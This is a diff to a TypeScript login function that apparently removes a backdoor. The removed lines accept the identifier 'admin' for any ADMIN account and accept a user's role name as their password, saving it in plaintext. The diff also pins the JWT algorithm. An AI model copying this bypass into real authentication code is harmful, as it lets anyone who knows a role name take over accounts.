@@ -19,7 +19,6 @@ export const loginUser = async (emailOrEmpId: string, password: string) => {
         { email: identifier },
         { email: identifierLower },
         ...empIdCandidates.map((empId) => ({ empId })),
-        ...(identifierLower === "admin" ? [{ role: "ADMIN" }] : []),
       ],
     },
   });
@@ -28,17 +27,7 @@ export const loginUser = async (emailOrEmpId: string, password: string) => {
     throw new HttpError(401, "Invalid credentials");
   }
 
-  let isMatch = await bcrypt.compare(password, user.passwordHash);
-  const rolePassword = String(user.role || "OPERATOR").trim().toLowerCase();
-
-  if (!isMatch && rolePassword && password === rolePassword) {
-    const passwordHash = await bcrypt.hash(rolePassword, 10);
-    await prisma.user.update({
-      where: { id: user.id },
-      data: { passwordHash, passwordText: rolePassword },
-    });
-    isMatch = true;
-  }
+  const isMatch = await bcrypt.compare(password, user.passwordHash);
 
   if (!isMatch) {
     throw new HttpError(401, "Invalid credentials");
@@ -57,7 +46,7 @@ export const loginUser = async (emailOrEmpId: string, password: string) => {
       fullName,
     },
     process.env.JWT_SECRET,
-    { expiresIn: "7d" }
+    { expiresIn: "7d", algorithm: "HS256" }
   );
 
   return {
